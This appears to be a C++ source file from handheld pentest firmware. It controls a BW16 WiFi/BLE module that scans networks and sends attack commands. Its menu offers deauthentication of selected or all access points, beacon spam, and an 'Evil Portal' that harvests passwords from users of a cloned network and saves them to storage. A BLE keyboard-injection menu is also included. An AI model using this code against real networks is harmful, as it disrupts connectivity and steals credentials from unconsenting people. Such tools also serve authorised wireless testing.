#include "bw16.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"

#define BW16_RX_PIN bruceConfigPins.gps_bus.rx
#define BW16_TX_PIN bruceConfigPins.gps_bus.tx

HardwareSerial *BW16Serial = &Serial2;

BW16Tool::BW16Tool() {}
BW16Tool::~BW16Tool() { end(); }

void BW16Tool::setup() {
    if (isBW16Active) return;
    ioExpander.turnPinOnOff(IO_EXP_GPS, HIGH);
    begin_bw16();
}

bool BW16Tool::begin_bw16() {
    releasePins();
    BW16Serial->setRxBufferSize(4096);
    BW16Serial->begin(115200, SERIAL_8N1, BW16_RX_PIN, BW16_TX_PIN);
    isBW16Active = true;
    return true;
}

void BW16Tool::end() {
    if (!isBW16Active) return;
    BW16Serial->end();
    restorePins();
    isBW16Active = false;
}

String BW16Tool::readSerialLine() {
    String line = "";
    if (!BW16Serial->available()) return line;
    line = BW16Serial->readStringUntil('\n');
    line.trim();
    return line;
}

void BW16Tool::display_banner() {
    drawMainBorderWithTitle("BW16 Tool");
    padprintln("");
}

void BW16Tool::save_captured_creds(const std::vector<String> &creds) {
    if (creds.empty()) return;
    bool wantToSave = false;
    std::vector<Option> saveOptions = {
        {"Yes", [&]() { wantToSave = true; } },
        {"No",  [&]() { wantToSave = false; }}
    };

    loopOptions(saveOptions);
    if (!wantToSave) return;
    String filename = keyboard("passwords", 30, "File name (.txt):");
    if (filename.length() == 0) return;

    if (!filename.startsWith("/")) filename = "/" + filename;
    if (!filename.endsWith(".txt")) filename += ".txt";
    display_banner();
    FS *fs = nullptr;
    bool sdAvailable = setupSdCard();
    bool fsAvailable = checkLittleFsSize();

    if (sdAvailable && fsAvailable) {
        std::vector<Option> storageOptions = {
            {"SD Card",  [&]() { fs = &SD; }      },
            {"LittleFS", [&]() { fs = &LittleFS; }},
        };
        loopOptions(storageOptions);
    } else if (sdAvailable) {
        fs = &SD;
    } else if (fsAvailable) {
        fs = &LittleFS;
    }

    if (!fs) {
        displayError("No storage available!", true);
        return;
    }

    File file = fs->open(filename, FILE_WRITE);
    if (file) {
        file.println("--- EVIL PORTAL CREDENTIALS ---");
        for (const auto &pass : creds) { file.println(pass); }
        file.close();
        displaySuccess("Saved to " + String((fs == &SD) ? "SD Card" : "LittleFS"), true);
    } else {
        displayError("Error writing file!", true);
    }

    delay(1000);
}

void BW16Tool::scanWifi() {
    setup();
    drawMainBorderWithTitle("BW16 Scanning");
    tft.setCursor(20, 60);
    padprintln("Please wait...");

    all_networks.clear();
    grouped_networks.clear();
    selected_bssids.clear();

    while (BW16Serial->available()) BW16Serial->read();
    BW16Serial->println("SCAN");

    unsigned long startTime = millis();
    bool scanning = true;

    while (scanning) {
        if (check(EscPress)) return;
        if (BW16Serial->available()) {
            String line = readSerialLine();
            if (line.indexOf("scan_done") != -1) {
                scanning = false;
                break;
            }

            int firstComma = line.indexOf(',');
            int secondComma = line.indexOf(',', firstComma + 1);
            int thirdComma = line.indexOf(',', secondComma + 1);

            if (firstComma != -1 && secondComma != -1 && thirdComma != -1) {
                BW16Network net;
                net.ssid = line.substring(0, firstComma);
                net.bssid = line.substring(firstComma + 1, secondComma);
                net.channel = line.substring(secondComma + 1, thirdComma).toInt();
                net.rssi = line.substring(thirdComma + 1).toInt();
                net.index = all_networks.size();
                all_networks.push_back(net);
                tft.printf("> Found: %s\n", net.ssid.substring(0, 15).c_str());
            }
        }
        if (millis() - startTime > 10000) scanning = false;
    }

    if (!all_networks.empty()) {
        for (const auto &net : all_networks) {
            bool found = false;
            for (auto &group : grouped_networks) {
                if (group.ssid == net.ssid) {
                    group.aps.push_back(net);
                    if (net.channel > 14) group.has5 = true;
                    else group.has24 = true;
                    if (net.rssi > group.maxRssi) group.maxRssi = net.rssi;
                    found = true;
                    break;
                }
            }
            if (!found) {
                BW16Group newG;
                newG.ssid = net.ssid;
                newG.aps.push_back(net);
                newG.maxRssi = net.rssi;
                if (net.channel > 14) newG.has5 = true;
                else newG.has24 = true;
                grouped_networks.push_back(newG);
            }
        }
        std::sort(
            grouped_networks.begin(), grouped_networks.end(), [](const BW16Group &a, const BW16Group &b) {
                return a.maxRssi > b.maxRssi;
            }
        );

        selectWifi();
    } else {
        displayError("No networks found!");
    }
}

void BW16Tool::selectWifi() {
    if (all_networks.empty()) {
        displayError("Scan WiFi first!");
        return;
    }

    std::vector<BW16Group> grouped_networks;
    for (const auto &net : all_networks) {
        bool found = false;
        for (auto &group : grouped_networks) {
            if (group.ssid == net.ssid) {
                group.aps.push_back(net);
                if (net.channel > 14) group.has5 = true;
                else group.has24 = true;
                if (net.rssi > group.maxRssi) group.maxRssi = net.rssi;
                found = true;
                break;
            }
        }
        if (!found) {
            BW16Group newG;
            newG.ssid = net.ssid;
            newG.aps.push_back(net);
            newG.maxRssi = net.rssi;
            if (net.channel > 14) newG.has5 = true;
            else newG.has24 = true;
            grouped_networks.push_back(newG);
        }
    }
    std::sort(grouped_networks.begin(), grouped_networks.end(), [](const BW16Group &a, const BW16Group &b) {
        return a.maxRssi > b.maxRssi;
    });

    bool stayingInMenu = true;
    static int myCursor = 1;

    while (stayingInMenu) {
        options.clear();
        returnToMenu = false;

        if (selected_bssids.empty()) {
            String scanCountLabel = "[Found: " + String(grouped_networks.size()) + " AP]";
            static String staticScanLabel;
            staticScanLabel = scanCountLabel;
            options.push_back({staticScanLabel.c_str(), [&]() {}});
        } else {
            static String staticAttackLabel;
            staticAttackLabel = "[OPEN ATTACK MENU (" + String(selected_bssids.size()) + ")]";
            options.push_back({staticAttackLabel.c_str(), [this]() {
                                   this->attackWifiMenu();
                                   returnToMenu = true;
                               }});
        }

        for (int i = 0; i < (int)grouped_networks.size(); i++) {
            bool allSelected = true;
            for (const auto &ap : grouped_networks[i].aps) {
                bool found = false;
                for (auto &s : selected_bssids) {
                    if (s == ap.bssid) {
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    allSelected = false;
                    break;
                }
            }

            String prefix = allSelected ? "[x] " : "[ ] ";
            String bandStr = "";
            if (grouped_networks[i].has24 && grouped_networks[i].has5) bandStr = "2.4G / 5G";
            else if (grouped_networks[i].has5) bandStr = "5G";
            else bandStr = "2.4G";

            String displaySSID = grouped_networks[i].ssid;
            String infoBlock = " [ " + String(grouped_networks[i].maxRssi) + " dBm, " + bandStr + " ]";

            String *optionText = new String(prefix + displaySSID + infoBlock);

            options.push_back(
                {optionText->c_str(), [this, i, allSelected, &grouped_networks]() {
                     if (allSelected) {
                         for (const auto &ap : grouped_networks[i].aps) {
                             auto it = std::find(selected_bssids.begin(), selected_bssids.end(), ap.bssid);
                             if (it != selected_bssids.end()) selected_bssids.erase(it);
                         }
                     } else {
                         for (const auto &ap : grouped_networks[i].aps) {
                             if (std::find(selected_bssids.begin(), selected_bssids.end(), ap.bssid) ==
                                 selected_bssids.end()) {
                                 selected_bssids.push_back(ap.bssid);
                             }
                         }
                     }
                     returnToMenu = true;
                     vTaskDelay(100 / portTICK_PERIOD_MS);
                 }}
            );
        }

        options.push_back({"Rescan", [this]() { this->scanWifi(); }});
        options.push_back({"Main Menu", [&]() {
                               stayingInMenu = false;
                               returnToMenu = true;
                           }});

        myCursor = loopOptions(options, myCursor);

        if (check(EscPress) || (returnToMenu && myCursor == (int)options.size() - 1)) {
            stayingInMenu = false;
        } else if (returnToMenu) {
            returnToMenu = false;
        }
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

void BW16Tool::attackWifiMenu() {
    options = {
        {"Deauth Selected", [&]() { attackSelected(); }   },
        {"Deauth ALL",      [&]() { attackAll(); }        },
        {"Beacon Spam",     [&]() { beaconSpam(); }       },
        {"Beacon List",     [&]() { beaconList(); }       },
        {"Beacon & Deauth", [&]() { beaconDeauth(); }     },
        {"Evil Portal",     [&]() { evilPortal(); }       },
        {"Main Menu",       [&]() { returnToMenu = true; }}
    };
    loopOptions(options);
}

void BW16Tool::attckbleMenu() {
    setup();
    BW16Serial->println("BLE START");

    bool stayingInBLE = true;
    bool isBleConnected = false;
    bool lastState = true;
    static int bleCursor = 0;

    while (BW16Serial->available()) BW16Serial->read();

    while (stayingInBLE) {
        if (BW16Serial->available()) {
            String feedback = readSerialLine();
            if (feedback == "BLE_ON") {
                isBleConnected = true;
            } else if (feedback == "BLE_OFF") {
                isBleConnected = false;
                returnToMenu = true;
            }
        }
        if (!isBleConnected) {
            if (lastState != isBleConnected) {
                tft.fillScreen(bruceConfig.bgColor);
                drawMainBorderWithTitle("BLE Status");
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.setCursor(10, 60);
                padprintln("BLE Connection:");
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                padprintln("BLE_Keyboard");

                tft.setTextColor(TFT_LIGHTGREY, bruceConfig.bgColor);
                tft.setCursor(10, 100);
                padprintln("Waiting for device...");

                tft.setCursor(10, 120);
                padprintln("[ESC] to Exit");
                lastState = isBleConnected;
            }

            if (check(EscPress)) {
                BW16Serial->println("BLE STOP");
                stayingInBLE = false;
            }
        } else {
            if (lastState != isBleConnected) {
                tft.fillScreen(bruceConfig.bgColor);
                lastState = isBleConnected;
            }

            returnToMenu = false;
            options = {
                {"Lock",         [&]() { send_at_ble("BLE_LOCK"); }         },
                {"Shut down",    [&]() { send_at_ble("BLE_SHUTDOWN"); }     },
                {"Restart",      [&]() { send_at_ble("BLE_RESTART"); }      },
                {"Sleep",        [&]() { send_at_ble("BLE_SLEEP"); }        },
                {"Hibernate",    [&]() { send_at_ble("BLE_HIBERNATE"); }    },
                {"Screenshot",   [&]() { send_at_ble("BLE_SCREENSHOT"); }   },
                {"Mute",         [&]() { send_at_ble("BLE_MUTE"); }         },
                {"Volume +",     [&]() { send_at_ble("BLE_VOL_UP"); }       },
                {"Volume -",     [&]() { send_at_ble("BLE_VOL_DOWN"); }     },
                {"Brightness +", [&]() { send_at_ble("BLE_BRIGHT_UP"); }    },
                {"Brightness -", [&]() { send_at_ble("BLE_BRIGHT_DOWN"); }  },
                {"Play/Pause",   [&]() { send_at_ble("BLE_PLAY"); }         },
                {"Next Track",   [&]() { send_at_ble("BLE_NEXT"); }         },
                {"Prev Track",   [&]() { send_at_ble("BLE_PREV"); }         },
                {"CapsLock",     [&]() { send_at_ble("BLE_CAPS"); }         },
                {"Left",         [&]() { send_at_ble("BLE_KEY_LEFT"); }     },
                {"Right",        [&]() { send_at_ble("BLE_KEY_RIGHT"); }    },
                {"Up",           [&]() { send_at_ble("BLE_KEY_UP"); }       },
                {"Down",         [&]() { send_at_ble("BLE_KEY_DOWN"); }     },
                {"Scroll Up",    [&]() { send_at_ble("BLE_SCROLL_UP"); }    },
                {"Scroll Down",  [&]() { send_at_ble("BLE_SCROLL_DOWN"); }  },
                {"Home",         [&]() { send_at_ble("BLE_KEY_HOME"); }     },
                {"End",          [&]() { send_at_ble("BLE_KEY_END"); }      },
                {"Esc",          [&]() { send_at_ble("BLE_KEY_ESC"); }      },
                {"Enter",        [&]() { send_at_ble("BLE_KEY_ENTER"); }    },
                {"Backspace",    [&]() { send_at_ble("BLE_KEY_BACKSPACE"); }},
                {"Tab",          [&]() { send_at_ble("BLE_KEY_TAB"); }      },
                {"Page Up",      [&]() { send_at_ble("BLE_KEY_PAGE_UP"); }  },
                {"Page Down",    [&]() { send_at_ble("BLE_KEY_PAGE_DOWN"); }},
                {"Window",       [&]() { send_at_ble("BLE_WIN"); }          },
                {"Phim hay",     [&]() { send_at_ble("BLE_PHIMHAY"); }      },
                {"Key board",    [&]() { send_at_ble("BLE_RANDOM"); }       },
                {"Mouse",        [&]() { send_at_ble("BLE_MOUSE"); }        },
                {"Spam",         [&]() { send_at_ble("BLE_SPAM"); }         },
                {"Main Menu",    [&]() { returnToMenu = true; }             }
            };

            bleCursor = loopOptions(options, bleCursor);
            if (check(EscPress) || (returnToMenu && bleCursor == (int)options.size() - 1)) {
                BW16Serial->println("BLE STOP");
                stayingInBLE = false;
            } else if (returnToMenu && !isBleConnected) {
                returnToMenu = false;
            } else if (returnToMenu) {
                returnToMenu = false;
            }
        }
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

void BW16Tool::attackSelected() {
    if (selected_bssids.empty()) return;
    String cmd = "ATTACK ";
    bool first = true;
    for (auto &bssid : selected_bssids) {
        for (auto &net : all_networks) {
            if (net.bssid == bssid) {
                if (!first) cmd += ",";
                cmd += String(net.index);
                first = false;
                break;
            }
        }
    }
    send_attack_command(cmd);
}

void BW16Tool::attackAll() { send_attack_command("ATTACK ALL"); }
void BW16Tool::beaconSpam() { send_attack_command("BEACON SPAM"); }
void BW16Tool::beaconList() { send_attack_command("BEACON"); }
void BW16Tool::beaconDeauth() { send_attack_command("BEACON AND ATTACK"); }

void BW16Tool::send_attack_command(String type) {
    drawMainBorderWithTitle("BW16 Attack");
    tft.setCursor(20, 60);
    padprintln("Running: " + type);
    tft.setCursor(20, 70);
    padprintln("[SEL] to Stop");

    BW16Serial->println(type);
    while (true) {
        if (check(SelPress)) {
            BW16Serial->println("STOP");
            vTaskDelay(200 / portTICK_PERIOD_MS);
            break;
        }
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

void BW16Tool::send_at_ble(String type) {
    BW16Serial->println(type);
    displayTextLine("Sending: " + type);
    vTaskDelay(300 / portTICK_PERIOD_MS);
}

void BW16Tool::evilPortal() {
    if (selected_bssids.empty()) {
        displayError("No targets selected!");
        return;
    }

    String targetSSID = "Unknown";
    int targetChannel = 0;
    String cmd = "EVIL ";
    bool first = true;
    for (auto &bssid : selected_bssids) {
        for (auto &net : all_networks) {
            if (net.bssid == bssid) {
                if (first) {
                    targetSSID = net.ssid;
                    targetChannel = net.channel;
                }
                if (!first) cmd += ",";
                cmd += String(net.index);
                first = false;
                break;
            }
        }
    }

    std::vector<String> capturedCreds;
    int selectedIndex = -1;
    int scrollOffset = 0;

    const int EP_LIST_X = 8;
    const int EP_LIST_Y = 75;
    const int EP_LIST_W = tftWidth - 16;
    const int EP_LIST_H = tftHeight - EP_LIST_Y - 30;
    const int ROW_H = 24;
    const int MAX_VISIBLE_ITEMS = EP_LIST_H / ROW_H;

    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("Evil Portal");
    tft.setTextColor(TFT_ORANGE, bruceConfig.bgColor);
    tft.setTextSize(1);
    tft.setCursor(10, 45);
    tft.printf("Target: %s", targetSSID.substring(0, 22).c_str());

    tft.setCursor(10, 55);
    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
    tft.printf("Ch: %d | Captured: 0", targetChannel);

    tft.drawRect(EP_LIST_X - 1, EP_LIST_Y - 1, EP_LIST_W + 2, EP_LIST_H + 2, TFT_RED);
    tft.fillRect(EP_LIST_X, EP_LIST_Y, EP_LIST_W, EP_LIST_H, TFT_BLACK);

    tft.setTextColor(TFT_LIGHTGREY, bruceConfig.bgColor);
    centerString("[Up/Down]: Scroll | [Sel]: Stop");

    while (BW16Serial->available()) BW16Serial->read();
    BW16Serial->println(cmd);

    bool running = true;
    bool needRedraw = true;
    unsigned long lastMarqueeUpdate = 0;
    int marqueeOffset = 0;

    while (running) {
        if (check(SelPress)) {
            running = false;
            break;
        }
        if (check(NextPress)) {
            if (!capturedCreds.empty() && selectedIndex < (int)capturedCreds.size() - 1) {
                selectedIndex++;
                if (selectedIndex >= scrollOffset + MAX_VISIBLE_ITEMS) { scrollOffset++; }
                needRedraw = true;
                marqueeOffset = 0;
            }
        }
        if (check(PrevPress)) {
            if (!capturedCreds.empty() && selectedIndex > 0) {
                selectedIndex--;
                if (selectedIndex < scrollOffset) { scrollOffset--; }
                needRedraw = true;
                marqueeOffset = 0;
            }
        }
        if (BW16Serial->available()) {
            String line = readSerialLine();
            if (line.length() > 0) {
                if (line.indexOf("[CAPTIVE]") != -1 || line.indexOf("Password") != -1) {
                    String pass = line.substring(line.indexOf(":") + 1);
                    pass.trim();

                    capturedCreds.push_back(pass);

                    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
                    tft.setTextSize(1);
                    tft.setCursor(10, 55);
                    tft.printf("Ch: %d | Captured: %d ", targetChannel, capturedCreds.size());

                    selectedIndex = capturedCreds.size() - 1;
                    if (selectedIndex >= MAX_VISIBLE_ITEMS) {
                        scrollOffset = selectedIndex - MAX_VISIBLE_ITEMS + 1;
                    }

                    needRedraw = true;
                }
            }
        }
        if (millis() - lastMarqueeUpdate > 100) {
            lastMarqueeUpdate = millis();
            if (!capturedCreds.empty() && selectedIndex != -1) {
                needRedraw = true;
                marqueeOffset += 5;
            }
        }
        if (needRedraw) {
            tft.setTextSize(2);
            tft.setTextWrap(false);

            for (int i = 0; i < MAX_VISIBLE_ITEMS; i++) {
                int dataIdx = scrollOffset + i;
                int rowY = EP_LIST_Y + (i * ROW_H);
                uint16_t rowBgColor = TFT_BLACK;
                bool isSelected = (dataIdx == selectedIndex);

                if (dataIdx < (int)capturedCreds.size() && isSelected) { rowBgColor = TFT_DARKGREY; }

                // Vẽ nền cho dòng
                tft.fillRect(EP_LIST_X, rowY, EP_LIST_W, ROW_H, rowBgColor);

                if (dataIdx >= (int)capturedCreds.size()) continue;

                String text = capturedCreds[dataIdx];

                if (isSelected) {
                    tft.setTextColor(TFT_YELLOW, rowBgColor);

                    // THAY THẾ VIEWPORT BẰNG MARQUEE CẮT CHUỖI
                    int maxChars = 15; // StickS3 màn hình hẹp, cỡ chữ 2 khoảng 15 ký tự
                    if (text.length() > maxChars) {
                        // Tạo hiệu ứng chạy chữ bằng cách cắt chuỗi
                        int charOffset = (marqueeOffset / 20) % (text.length());
                        String scrollingText = text.substring(charOffset);
                        if (scrollingText.length() < maxChars) {
                            scrollingText += "   " + text.substring(0, maxChars - scrollingText.length());
                        }
                        tft.setCursor(EP_LIST_X + 5, rowY + 4);
                        tft.print(scrollingText.substring(0, maxChars));
                    } else {
                        tft.setCursor(EP_LIST_X + 5, rowY + 4);
                        tft.print(text);
                    }
                } else {
                    tft.setTextColor(TFT_WHITE, rowBgColor);
                    tft.setCursor(EP_LIST_X + 5, rowY + 4);
                    // Cắt ngắn nếu không được chọn
                    if (text.length() > 15) text = text.substring(0, 13) + "..";
                    tft.print(text);
                }
            }
            if (capturedCreds.empty()) {
                tft.setTextSize(1);
                tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
                tft.setCursor(EP_LIST_X + 10, EP_LIST_Y + EP_LIST_H / 2 - 5);
                tft.print("Waiting for credentials...");
            }

            needRedraw = false;
        }

        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (!capturedCreds.empty()) { save_captured_creds(capturedCreds); }

    BW16Serial->println("STOP");

    displayError("STOPPING...");

    vTaskDelay(50 / portTICK_PERIOD_MS);
    BW16Serial->println("STOP");
    delay(500);
}

void BW16Tool::centerString(String text) {
    int x = (tftWidth - tft.textWidth(text)) / 2;
    if (x < 0) x = 0;
    int y = tftHeight - 20;
    tft.setCursor(x, y);
    tft.print(text);
}

void BW16Tool::releasePins() {
    rxPinReleased = false;
    if (bruceConfigPins.SDCARD_bus.checkConflict(BW16_RX_PIN)) {
        pinMode(BW16_RX_PIN, INPUT);
        rxPinReleased = true;
    }
}

void BW16Tool::restorePins() {
    if (rxPinReleased) {
        pinMode(BW16_RX_PIN, OUTPUT);
        digitalWrite(BW16_RX_PIN, HIGH);
        rxPinReleased = false;
    }
}
